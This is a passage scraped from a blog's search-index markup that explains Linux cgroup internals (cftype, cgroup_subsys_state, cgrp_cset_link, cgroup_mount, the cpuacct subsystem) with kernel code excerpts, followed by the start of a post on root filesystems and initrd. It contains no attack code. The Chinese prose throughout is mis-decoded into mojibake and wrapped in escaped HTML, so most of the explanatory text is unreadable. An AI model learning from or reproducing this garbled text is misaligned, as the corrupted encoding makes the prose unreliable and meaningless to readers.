&lt;p&gt;ä¸åŒå­ç³»ç»Ÿçš„ç»“æ„ä½“ç¬¬ä¸€ä¸ªå…ƒç´ éƒ½æ˜¯cgroup_subsys_stateä»¥ä¾¿äºä½¿ç”¨container_ofã€‚ä»¥mem_cgroupå­ç³»ç»Ÿä¸ºä¾‹ï¼Œmem_cgroupå­ç³»ç»Ÿçš„ç»“æ„ä½“æ˜¯mem_cgroupï¼Œæ¯ä¸ªcss_setéƒ½å¯ä»¥container_of css_set-&amp;gt;subsys[mem_cgroup_subsys_id]å¼•ç”¨åˆ°ä¸€ä¸ªmem_cgroupå®ä¾‹ã€‚ç›¸å¯¹äºmem_cgroupç»“æ„ä½“ï¼Œcgroup_subsysç”¨äºå…¨å±€æè¿°ä¸€ä¸ªsubsysã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;cftype&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨cgroupæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªç›®å½•ä¸‹æœ‰å„ä¸ªå­ç³»ç»Ÿçš„æ–‡ä»¶ï¼Œè€Œä¸åŒå­ç³»ç»Ÿçš„æ–‡ä»¶æ˜¯ä¸ä¸€æ ·çš„ï¼Œå†…æ ¸é‡Œé€šè¿‡cftypeç»“æ„ä½“æ¥æè¿°è¿™äº›æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;cftypeè¿™ä¸ªç»“æ„ä½“é‡Œä¸»è¦æ˜¯ä¸€äº›æ–‡ä»¶æ“ä½œå‡½æ•°å’Œæ–‡ä»¶çš„æè¿°ä¿¡æ¯ã€‚æ‰€æœ‰å¯¹æ–‡ä»¶çš„æ“ä½œï¼Œéƒ½ä¼šè°ƒç”¨è¿™ä¸ªç»“æ„ä½“ä¸­çš„æ“ä½œå‡½æ•°ã€‚æ¯ä¸ªsubsysåœ¨cgroup_subsys-&amp;gt;base_cftypesä¸­å®šä¹‰è‡ªå·±ä¸“æœ‰çš„æ–‡ä»¶ã€‚è€Œcgroupæ¯ä¸ªç›®å½•ä¸‹éƒ½æœ‰äº›ç›¸åŒçš„æ–‡ä»¶åƒtasksä¹‹ç±»çš„ï¼Œä¿å­˜åœ¨cgroup.cä¸­çš„filesæ•°ç»„ä¸­ï¼Œè¿™æ—¶æ¯ä¸ªç›®å½•éƒ½ä¼šæœ‰çš„ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;struct cftype {
	/*
	 * By convention, the name should begin with the name of the
	 * subsystem, followed by a period.  Zero length string indicates
	 * end of cftype array.
	 */
	char name[MAX_CFTYPE_NAME];
	int private;
	/*
	 * If not 0, file mode is set to this value, otherwise it will
	 * be figured out automatically
	 */
	umode_t mode;

	/*
	 * If non-zero, defines the maximum length of string that can
	 * be passed to write_string; defaults to 64
	 */
	size_t max_write_len;

	/* CFTYPE_* flags */
	unsigned int flags;
	
	int (*open)(struct inode *inode, struct file *file);
	...		
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¾‹å¦‚CPUå­ç³»ç»Ÿï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// kernel/sched/core.c 
static struct cftype cpu_files[] = {
#ifdef CONFIG_FAIR_GROUP_SCHED
    {
        .name = &amp;quot;shares&amp;quot;, 
        .read_u64 = cpu_shares_read_u64, 
        .write_u64 = cpu_shares_write_u64, 
    },
#endif
#ifdef CONFIG_CFS_BANDWIDTH
    {
        .name = &amp;quot;cfs_quota_us&amp;quot;, 
        .read_s64 = cpu_cfs_quota_read_s64, 
        .write_s64 = cpu_cfs_quota_write_s64, 
    },
    { 
        .name = &amp;quot;cfs_period_us&amp;quot;, 
        .read_u64 = cpu_cfs_period_read_u64, 
        .write_u64 = cpu_cfs_period_write_u64, 
    }, 
    { 
        .name = &amp;quot;stat&amp;quot;, 
        .seq_show = cpu_stats_show, 
    }, 
#endif
#ifdef CONFIG_RT_GROUP_SCHED
    {
        .name = &amp;quot;rt_runtime_us&amp;quot;, 
        .read_s64 = cpu_rt_runtime_read, 
        .write_s64 = cpu_rt_runtime_write, 
    },
    { 
        .name = &amp;quot;rt_period_us&amp;quot;, 
        .read_u64 = cpu_rt_period_read_uint, 
        .write_u64 = cpu_rt_period_write_uint, 
    }, 
#endif
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cgroup_subsys_state&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç»“æ„ä½“&lt;code&gt;cgroup_subsys_state&lt;/code&gt;æ˜¯ä¸€ä¸ª&amp;quot;ä¸­ä»‹&amp;quot;ï¼Œä»‹äºç»“æ„ä½“&lt;code&gt;cgroup&lt;/code&gt;å’Œç»“æ„ä½“&lt;code&gt;cgroup_subsys&lt;/code&gt;ä¹‹é—´ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;css_set&lt;/code&gt;æœ‰ä¸€ä¸ª&lt;code&gt;cgroup_subsys_state&lt;/code&gt;æŒ‡é’ˆæ•°ç»„ï¼Œå…±&lt;code&gt;CGROUP_SUBSYS_COUNT&lt;/code&gt;ä¸ªå…ƒç´ ï¼Œæ„å‘³è¿™æ¯ä¸ª&lt;code&gt;subsys&lt;/code&gt;åœ¨å…¶ä¸­éƒ½æœ‰ä¸ª&lt;code&gt;cgroup_subsys_state&lt;/code&gt;å®ä¾‹ç»“æ„ä½“ï¼Œä½†è¿™ä¸ªç»“æ„ä½“é‡Œå¹¶æ²¡æœ‰åŒ…å«å®é™…æ§åˆ¶ä¿¡æ¯ã€‚é‚£å…·ä½“æ§åˆ¶ä¿¡æ¯åœ¨å“ªå‘¢ï¼Ÿ&lt;code&gt;cgroup_subsys_state&lt;/code&gt;å®é™…æ˜¯å’Œkobjecctç±»ä¼¼ä½œç”¨çš„ä¸œè¥¿ï¼Œé‡Œé¢åŒ…å«äº†å„ä¸ªsubsyså…±æœ‰çš„ä¿¡æ¯ã€‚é€šè¿‡container_ofè·å–çš„åˆ°subsysç›´æ¥çš„å®ä¾‹ç»“æ„ä½“ï¼Œsubsysçš„ç§æœ‰æ§åˆ¶ä¿¡æ¯éƒ½åœ¨è¯¥å®é™…ç»“æ„ä½“ä¸­ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c+&#34;&gt;// include/linux/cgroup.h
struct cgroup_subsys_state {

    // æœ¬subsysæ‰€ä¾é™„çš„cgroup
    struct cgroup *cgroup;

    // ç”¨åˆ°çš„å­ç³»ç»Ÿ
    struct cgroup_subsys *ss;
    ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;cgroupå’Œè¿›ç¨‹çš„å…³ç³»ï¼Œæˆå‘˜ä¸º&lt;code&gt;cset_links&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;cgroupèŠ‚ç‚¹å’Œè¿›ç¨‹æ˜¯å¤šå¯¹å¤šæ˜ å°„ã€‚ä¸€ä¸ªcgrouèŠ‚ç‚¹ä¸­å¯ä»¥æœ‰å¤šä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªè¿›ç¨‹ä¹Ÿå¯ä»¥åŠ å…¥å¤šä¸ªcgroupã€‚&lt;/p&gt;
&lt;p&gt;å‡è®¾æœ‰ 3 ä¸ªè¿›ç¨‹ï¼Œ4 ä¸ªæ§åˆ¶ç»„ï¼Œè¿›ç¨‹ 1 ç”¨åˆ°æ§åˆ¶ç»„ 1 å’Œ 3ï¼Œè¿›ç¨‹ 2 ç”¨åˆ°æ§åˆ¶ç»„ 2 å’Œ 4ï¼Œè¿›ç¨‹ 3 ç”¨åˆ°æ§åˆ¶ç»„ 2 å’Œ 4ã€‚ä»è¿›ç¨‹çš„è§’åº¦çœ‹å’Œä»æ§åˆ¶ç»„çš„è§’åº¦çœ‹ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621996726696.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;åœ¨ç»“æ„cgroupä¸­æœ‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
struct cgroup { 
â€¦ 
    struct list_head cset_links; 
â€¦ 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç»“æ„ cgroup çš„æˆå‘˜ &lt;code&gt;cset_links&lt;/code&gt; å’Œå¦ä¸€ä¸ªç»“æ„ &lt;code&gt;cgrp_cset_link&lt;/code&gt; å…³è”ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;kernel/cgroup.c 
struct cgrp_cset_link { 
    /* the cgroup and css_set this link associates */ 
    struct cgroup *cgrp; 
    struct css_set *cset; 
    /* list of cgrp_cset_links anchored at cgrp-&amp;gt;cset_links */ 
    struct list_head cset_link; 
    /* list of cgrp_cset_links anchored at css_set-&amp;gt;cgrp_links */ 
    struct list_head cgrp_link; 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è”ç³»åœ¨ä¸€èµ·ï¼Œè¿˜æ˜¯ä¸Šé¢é‚£ä¸ªä¾‹å­ï¼Œå†…æ ¸ä¸­çš„æ•°æ®ç»“æ„å¦‚å›¾æ‰€ç¤ºã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621996916634.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;cgroup_root&lt;/code&gt;å’Œ&lt;code&gt;cgroup&lt;/code&gt;æ˜¯ä½¿ç”¨ä¸¤ä¸ªä¸åŒç»“æ„è¡¨ç¤ºçš„ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ–‡ä»¶ç³»ç»Ÿæ¥å£&#34;&gt;æ–‡ä»¶ç³»ç»Ÿæ¥å£&lt;/h3&gt;
&lt;p&gt;cgroupæ–‡ä»¶ç³»ç»Ÿæ˜¯cgroupæä¾›ç»™ç”¨æˆ·å±‚çš„æ§åˆ¶æ¥å£ï¼Œcgroupæ–‡ä»¶ç³»ç»ŸæŒ‚ä¸æŒ‚è½½ï¼Œcgroupéƒ½æ˜¯ç”Ÿæ•ˆè¿è¡Œçš„ã€‚&lt;/p&gt;
&lt;h4 id=&#34;mountå‡½æ•°&#34;&gt;mountå‡½æ•°&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static struct dentry *cgroup_mount(struct file_system_type *fs_type,
			 int flags, const char *unused_dev_name,
			 void *data)
{
	struct cgroup_sb_opts opts;
	struct cgroupfs_root *root;
	int ret = 0;
	struct super_block *sb;
	struct cgroupfs_root *new_root;
	struct inode *inode;

	/* First find the desired set of subsystems */
	mutex_lock(&amp;amp;cgroup_mutex);
	ret = parse_cgroupfs_options(data, &amp;amp;opts);//è§£ææŒ‚è½½å‚æ•°ï¼Œçœ‹éœ€è¦attachå“ªäº›subsys
	mutex_unlock(&amp;amp;cgroup_mutex);
	if (ret)
		goto out_err;

	/*
	 * Allocate a new cgroup root. We may not need it if we&#39;re
	 * reusing an existing hierarchy.
	 */
	new_root = cgroup_root_from_opts(&amp;amp;opts);//ä¾æ®æŒ‚è½½å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„cgroupfs_rootï¼Œåé¢å¦‚æœæœ‰å‘ç°å·²ç”³è¯·äº†ç›¸åŒçš„ä¼šfreeæ‰è¿™ä¸ªç»“æ„ä½“
	if (IS_ERR(new_root)) {
		ret = PTR_ERR(new_root);
		goto drop_modules;
	}
	opts.new_root = new_root;

	/* Locate an existing or new sb for this hierarchy */
	//è·å–sbè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„sb
	sb = sget(fs_type, cgroup_test_super, cgroup_set_super, 0, &amp;amp;opts);
	if (IS_ERR(sb)) {
		ret = PTR_ERR(sb);
		cgroup_drop_root(opts.new_root);
		goto drop_modules;
	}

	root = sb-&amp;gt;s_fs_info;
	BUG_ON(!root);
	if (root == opts.new_root) {//æœªæŒ‚è½½ç›¸åŒå‚æ•°çš„cgroup fs
		/* We used the new root structure, so this is a new hierarchy */
		struct list_head tmp_cg_links;
		struct cgroup *root_cgrp = &amp;amp;root-&amp;gt;top_cgroup;
		struct cgroupfs_root *existing_root;
		const struct cred *cred;
		int i;
		struct css_set *cg;

		BUG_ON(sb-&amp;gt;s_root != NULL);

		ret = cgroup_get_rootdir(sb);
		if (ret)
			goto drop_new_super;
		inode = sb-&amp;gt;s_root-&amp;gt;d_inode;

		mutex_lock(&amp;amp;inode-&amp;gt;i_mutex);
		mutex_lock(&amp;amp;cgroup_mutex);
		mutex_lock(&amp;amp;cgroup_root_mutex);

		/* Check for name clashes with existing mounts */
		ret = -EBUSY;
		if (strlen(root-&amp;gt;name))
			for_each_active_root(existing_root)
				if (!strcmp(existing_root-&amp;gt;name, root-&amp;gt;name))
					goto unlock_drop;

		/*
		 * We&#39;re accessing css_set_count without locking
		 * css_set_lock here, but that&#39;s OK - it can only be
		 * increased by someone holding cgroup_lock, and
		 * that&#39;s us. The worst that can happen is that we
		 * have some link structures left over
		 */
		//css_set_countæ˜¯å†…æ ¸ä¸­å·²æœ‰css_setçš„ä¸ªæ•°
		ret = allocate_cg_links(css_set_count, &amp;amp;tmp_cg_links);
		if (ret)
			goto unlock_drop;

		//å°†subsys_maskæŒ‡ç¤ºçš„subsysç»‘å®šåˆ°å½“å‰cgroupfs_root
		ret = rebind_subsystems(root, root-&amp;gt;subsys_mask);
		if (ret == -EBUSY) {
			free_cg_links(&amp;amp;tmp_cg_links);
			goto unlock_drop;
		}
		/*
		 * There must be no failure case after here, since rebinding
		 * takes care of subsystems&#39; refcounts, which are explicitly
		 * dropped in the failure exit path.
		 */

		/* EBUSY should be the only error here */
		BUG_ON(ret);

		list_add(&amp;amp;root-&amp;gt;root_list, &amp;amp;roots);
		root_count++;

		sb-&amp;gt;s_root-&amp;gt;d_fsdata = root_cgrp;
		root-&amp;gt;top_cgroup.dentry = sb-&amp;gt;s_root;

		/* Link the top cgroup in this hierarchy into all
		 * the css_set objects */
		//å°†å½“å‰æ‰€æœ‰çš„css_setå…³è”åˆ°è¿™ä¸ªroot_cgrpä¸­
		write_lock(&amp;amp;css_set_lock);
		hash_for_each(css_set_table, i, cg, hlist)
			link_css_set(&amp;amp;tmp_cg_links, cg, root_cgrp);
		write_unlock(&amp;amp;css_set_lock);

		free_cg_links(&amp;amp;tmp_cg_links);

		BUG_ON(!list_empty(&amp;amp;root_cgrp-&amp;gt;children));
		BUG_ON(root-&amp;gt;number_of_cgroup != 1);

		cred = override_creds(&amp;amp;init_cred);
		cgroup_populate_dir(root_cgrp, true, root-&amp;gt;subsys_mask);// åˆ›å»ºæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶
		revert_creds(cred);
		mutex_unlock(&amp;amp;cgroup_root_mutex);
		mutex_unlock(&amp;amp;cgroup_mutex);
		mutex_unlock(&amp;amp;inode-&amp;gt;i_mutex);
	} else { //å·²å­˜åœ¨ç›¸åŒå‚æ•°çš„æ–‡ä»¶ç³»ç»Ÿ
		...
	}

	...
	return ERR_PTR(ret);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;cgroupæ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ä¸»è¦æ˜¯å°†å‚æ•°æ‰€æŒ‡å®šçš„subsysç»‘å®šåˆ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶å°†æ–°å±‚çº§çš„æ ¹cgroupå…³è”åˆ°ç°æœ‰çš„css_setä¸­ã€‚å°†subsysç»‘å®šåˆ°æ–‡ä»¶ç³»ç»Ÿç”¨çš„æ˜¯rebind_subsystemsè¿™ä¸ªå‡½æ•°ï¼Œä¸ºä»€ä¹ˆå«rebindå‘¢ï¼Ÿå› ä¸ºè¿™ä¸ªå‡½æ•°æ˜¯å°†åŸæ¥ç»‘å®šåˆ°rootnodeçš„subsysç»‘å®šåˆ°æ–°çš„cgroupfs_rootã€‚è€Œè¿™é‡Œçš„ç»‘å®šï¼Œæ˜¯å°†subsys-&amp;gt;rootæŒ‡å‘æ–°çš„cgroupfs_rootä¸­ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å„ä¸ªå­ç³»ç»Ÿçš„å®ç°&#34;&gt;å„ä¸ªå­ç³»ç»Ÿçš„å®ç°&lt;/h3&gt;
&lt;p&gt;ä¸Šé¢å¯ä»¥çŸ¥é“ï¼Œå†…æ ¸ä¸­çš„cgroupæœºåˆ¶æä¾›ä¸€ä¸ªæ¡†æ¶ï¼Œé€šè¿‡åœ¨å…¶ä¸­æ·»åŠ å­ç³»ç»Ÿï¼Œå¯ä»¥å®ç°å¯¹è¿›ç¨‹çš„ä¸åŒèµ„æºè¿›è¡Œé™åˆ¶ã€‚ä»¥cpuacctä¸ºä¾‹ï¼Œå…¶å­ç³»ç»Ÿå®ç°åœ¨kernel/sched/cpuacct.cï¼Œè¿™æ˜¯åœ¨è°ƒåº¦ç³»ç»Ÿé‡Œæ·»åŠ çš„ä¸€ä¸ªå­ç³»ç»Ÿï¼Œç”¨äºè¿›ç¨‹å ç”¨æ—¶é—´ç‰‡çš„ç»Ÿè®¡ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;struct cgroup_subsys cpuacct_subsys = {
	.name		= &amp;quot;cpuacct&amp;quot;,
	.css_alloc	= cpuacct_css_alloc,
	.css_free	= cpuacct_css_free,
	.subsys_id	= cpuacct_subsys_id,
	.base_cftypes	= files,
	.early_init	= 1,
};
static struct cftype files[] = {
	{
		.name = &amp;quot;usage&amp;quot;,
		.read_u64 = cpuusage_read,
		.write_u64 = cpuusage_write,
	},
	{
		.name = &amp;quot;usage_percpu&amp;quot;,
		.read_seq_string = cpuacct_percpu_seq_read,
	},
	{
		.name = &amp;quot;stat&amp;quot;,
		.read_map = cpuacct_stats_show,
	},
	{ }	/* terminate */
};
/* track cpu usage of a group of tasks and its child groups */
struct cpuacct {
	struct cgroup_subsys_state css;
	/* cpuusage holds pointer to a u64-type object on every cpu */
	u64 __percpu *cpuusage;
	struct kernel_cpustat __percpu *cpustat;
};
void cpuacct_charge(struct task_struct *tsk, u64 cputime)
{
	struct cpuacct *ca;
	int cpu;

	cpu = task_cpu(tsk);

	rcu_read_lock();

	ca = task_ca(tsk);

	while (true) {
		u64 *cpuusage = per_cpu_ptr(ca-&amp;gt;cpuusage, cpu);
		*cpuusage += cputime;

		ca = parent_ca(ca);
		if (!ca)
			break;
	}

	rcu_read_unlock();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;cpuacctå®ç°å¾ˆç®€å•ï¼Œå®šä¹‰äº†cpuacct_subsysï¼Œå®ƒçš„å±æ€§åªæœ‰ä¸‰ä¸ªï¼Œå†…åµŒcgroup_subsys_stateçš„ç»“æ„ä½“ä¹Ÿåªæœ‰ä¸¤ä¸ªé¢å¤–çš„percpuå˜é‡ã€‚å…¶è¿è¡ŒåŸç†æ˜¯åœ¨è¿›ç¨‹è°ƒåº¦çš„æ—¶å€™è°ƒç”¨cpuacct_chargeå°†è¿›ç¨‹è¿è¡Œæ—¶é—´è®°å½•åˆ°è¿›ç¨‹ç›¸å…³çš„cgroupçš„cpuacctå­ç³»ç»Ÿçš„ç»“æ„ä½“ä¸­ã€‚åœ¨ç”¨æˆ·è¯»ç›¸å…³cgroupæ–‡ä»¶çš„æ—¶å€™å°†å…¶æ‰“å°å‡ºæ¥ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ€»ç»“&#34;&gt;æ€»ç»“&lt;/h2&gt;
&lt;p&gt;cgroupçš„ç»„æŒ‡çš„æ˜¯ä¸€ç»„è¿›ç¨‹ã€‚å¦‚æœä¸åšå¹²é¢„ï¼Œè¿›ç¨‹åˆ›å»ºçš„å­è¿›ç¨‹ä¼šè¢«è‡ªåŠ¨åŠ å…¥åˆ°è¿›ç¨‹æ‰€åœ¨çš„æ§åˆ¶ç»„ä¹‹ä¸­ã€‚æ§åˆ¶ç»„çš„ä¼˜ç‚¹æ˜¯å¯ä»¥é’ˆå¯¹ä¸€ç»„æ•°é‡ä¸å®šçš„è¿›ç¨‹è¿›è¡Œæ§åˆ¶å’Œç»Ÿè®¡ã€‚&lt;/p&gt;
&lt;p&gt;æ§åˆ¶ç»„æ²¡æœ‰å¢åŠ æ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œæ˜¯å®ç°äº†ä¸€ç§æ–°çš„æ–‡ä»¶ç³»ç»Ÿ cgroupã€‚æœ‰äº† cgroup æ–‡ä»¶ç³»ç»Ÿï¼Œåˆ›å»ºå’Œåˆ é™¤æ§åˆ¶ç»„å°±è½¬åŒ–ä¸ºåˆ›å»ºå’Œåˆ é™¤ç›®å½•ï¼ŒæŸ¥çœ‹èµ„æºä½¿ç”¨æƒ…å†µå’Œè°ƒæ•´å‚æ•°å°±è½¬åŒ–ä¸ºè¯»å†™æ–‡ä»¶ã€‚ç›¸æ¯”ç³»ç»Ÿè°ƒç”¨ï¼Œæ“ä½œæ–‡ä»¶æ— ç–‘æ›´åŠ æ–¹ä¾¿ã€‚&lt;/p&gt;
">ã€linuxã€‘CGroup</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-wen-jian-xi-tong-yu-cao-zuo/"" data-c="
          &lt;h2 id=&#34;æ–‡ä»¶ç³»ç»Ÿ&#34;&gt;æ–‡ä»¶ç³»ç»Ÿ&lt;/h2&gt;
&lt;p&gt;æ–‡ä»¶ç³»ç»Ÿæ˜¯ç”¨æ¥ç®¡ç†ç¡¬ä»¶å­˜å‚¨è®¾å¤‡å­˜å‚¨æ–‡ä»¶çš„æ–¹å¼ï¼Œæ•°æ®åœ¨å¤–éƒ¨å­˜å‚¨è®¾å¤‡ä¸Šéƒ½æ˜¯ä»¥äºŒè¿›åˆ¶å½¢å¼å­˜å‚¨ï¼Œé‚£ä¹ˆä½•ä¸ºæ–‡ä»¶ã€ä½•ä¸ºç›®å½•ã€ä½•ä¸ºå¯æ‰§è¡Œç¨‹åºï¼Œæ€ä¹ˆè¯»å†™ï¼Œæ€ä¹ˆè§„åˆ’å­˜å‚¨ç©ºé—´éƒ½æ˜¯ç”±æ–‡ä»¶ç³»ç»Ÿå†³å®šï¼Œä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿç®¡ç†æ–¹å¼ä¸åŒã€‚&lt;/p&gt;
&lt;p&gt;æ–‡ä»¶ç³»ç»Ÿçš„åŠŸèƒ½å°±æ˜¯å¯¹å­˜å‚¨è®¾å¤‡çš„æ‰‡åŒºè¿›è¡Œç®¡ç†ï¼Œå°†è¿™äº›æ‰‡åŒºçš„è®¿é—®å˜æˆäº†å¯¹ç›®å½•å’Œæ–‡ä»¶åçš„è®¿é—®ã€‚æˆ‘ä»¬åœ¨ä¸Šå±‚æŒ‰ç…§ç‰¹å®šçš„ç›®å½•å’Œæ–‡ä»¶åå»è®¿é—®ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶ç³»ç»Ÿä¼šå°†è¿™ä¸ªç›®å½•+æ–‡ä»¶åè½¬æ¢æˆå¯¹æ‰‡åŒºå·çš„è®¿é—®ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ ¹æ–‡ä»¶ç³»ç»Ÿ&#34;&gt;æ ¹æ–‡ä»¶ç³»ç»Ÿ&lt;/h2&gt;
&lt;p&gt;å†…æ ¸åˆšå¯åŠ¨æ—¶ï¼Œç£ç›˜è®¾å¤‡ã€ç½‘ç»œè®¾å¤‡éƒ½è¿˜æ²¡æœ‰è¢«é©±åŠ¨èµ·æ¥ï¼Œæ‰€ä»¥æ— æ³•è®¿é—®ç£ç›˜ï¼Œæ²¡æ³•ç»™ç£ç›˜å¯ç”¨å¯¹åº”çš„æ–‡ä»¶ç³»ç»Ÿã€‚é‚£èµ¶ç´§å®‰è£…ç£ç›˜é©±åŠ¨ç¨‹åºï¼Œç½‘ç»œé©±åŠ¨ç¨‹åºå‘€ï¼Œæ€ä¹ˆä¸åŠ è½½å‘¢ï¼Ÿå› ä¸ºç£ç›˜ç§ç±»å¤ªå¤šäº†ï¼Œæ²¡æ³•æŠŠæ‰€æœ‰çš„é©±åŠ¨éƒ½ç¼–è¯‘åˆ°å†…æ ¸é‡Œå¤´ï¼Œé‚£æ ·å†…æ ¸å¾—å˜å¾—å¤šå¤§å‘€ï¼Œæ‰€ä»¥å°±åªèƒ½æŠŠè¿™äº›é©±åŠ¨ç¨‹åºç¼–è¯‘æˆæ¨¡å—çš„æ–¹å¼ï¼Œåœ¨å†…æ ¸åŠ è½½çš„æ—¶å€™ç°åœºåˆ¤æ–­å½“å‰ç”¨çš„æ˜¯ä»€ä¹ˆç£ç›˜å†åŠ ç›¸åº”çš„ç£ç›˜é©±åŠ¨æ¨¡å—ã€‚ä½†æ˜¯è¿˜æ²¡æ–‡ä»¶ç³»ç»Ÿï¼Œæ²¡æœ‰åŠæ³•åŠ è½½é©±åŠ¨æ¨¡å—ã€‚&lt;/p&gt;
&lt;p&gt;ç»“æœå¯ç”¨æ–‡ä»¶ç³»ç»Ÿçš„å‰ææ˜¯ç£ç›˜çš„é©±åŠ¨ç¨‹åºå·²ç»åŠ è½½ï¼Œè€Œé©±åŠ¨ç¨‹åºçš„åŠ è½½çš„å‰ææ˜¯å·²ç»æœ‰æ–‡ä»¶ç³»ç»Ÿå­˜åœ¨ï¼Œæ‰€ä»¥æ­¤æ—¶çš„æ–¹æ³•å°±æ˜¯åœ¨å†…å­˜å»ºç«‹ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿ(/boot/initrdæ–‡ä»¶)ï¼Œç„¶åæŒ‡å®šè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸ºæ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œå€ŸåŠ©è¿™ä¸ªä¸´æ—¶çš„æ–‡ä»¶ç³»ç»ŸæŠŠç£ç›˜é©±åŠ¨æ¨¡å—ã€ç½‘ç»œé©±åŠ¨æ¨¡å—åŠ è½½ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥è®¿é—®ç£ç›˜ã€ç½‘ç»œè®¾å¤‡ç­‰å¤–è®¾äº†ï¼Œå¯ä»¥æŒ‚è½½åˆ‡æ¢åˆ°å®é™…çš„æ–‡ä»¶ç³»ç»Ÿäº†ï¼Œæœ‰äº†å®é™…çš„æ–‡ä»¶ç³»ç»Ÿä¹‹åå†æŠŠè¿™ä¸ªå®é™…çš„æ–‡ä»¶ç³»ç»ŸæŒ‡å®šä¸ºæ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œç„¶åå…¶ä»–çš„å„å¼å„æ ·çš„æ–‡ä»¶ç³»ç»Ÿå°±å¯ä»¥é™†é™†ç»­ç»­çš„æŒ‚è½½åœ¨è¿™ä¸ªæ ¹æ–‡ä»¶ç³»ç»Ÿä¸‹äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ€ä¹ˆåœ¨å†…å­˜å»ºç«‹è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Ÿ&lt;/p&gt;
&lt;p&gt;é¦–å…ˆï¼Œåœ¨ç¼–è¯‘å†…æ ¸å¾—æ—¶å€™å°±ç¼–è¯‘ä¸€ä¸ªå¾ˆç²¾ç®€çš„è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿè¿›å»ï¼Œç„¶åå†…æ ¸åœ¨å¯åŠ¨çš„æ—¶å€™å…ˆæ³¨å†Œä¸€ä¸ªrootfsè¿™ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œç„¶åæŒ‚è½½è¿™ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œé‚£rootfsè¿™ä¸ªè™šæ‹Ÿæ–‡ä»¶è¿˜æ˜¯ä¸ªç©ºçš„ï¼Œå¾—ç»™é‡Œå¤´æ”¾ç‚¹ä¸œè¥¿å‘€ï¼Œæ”¾ä»€ä¹ˆå‘¢ï¼Ÿå°±æ”¾ç¼–è¯‘è¿›å†…æ ¸é‡Œå¤´çš„é‚£ä¸ªå¾ˆç²¾ç®€çš„è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿé‡Œçš„å†…å®¹ã€‚æ€ä¹ˆå†…å®¹æ”¾è¿›rootfsé‡Œå»ï¼Ÿæ–¹æ³•ç®€å•ç²—æš´ï¼Œç›´æ¥æŠŠç¼–è¯‘è¿›å†…æ ¸é‡Œå¤´çš„é‚£ä¸ªå¾ˆç²¾ç®€çš„è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿé‡Œçš„å†…å®¹è§£å‹åˆ°rootfsé‡Œï¼Œè¿™ä¸ªè¿‡ç¨‹å«å¡«å……rootfsã€‚&lt;/p&gt;
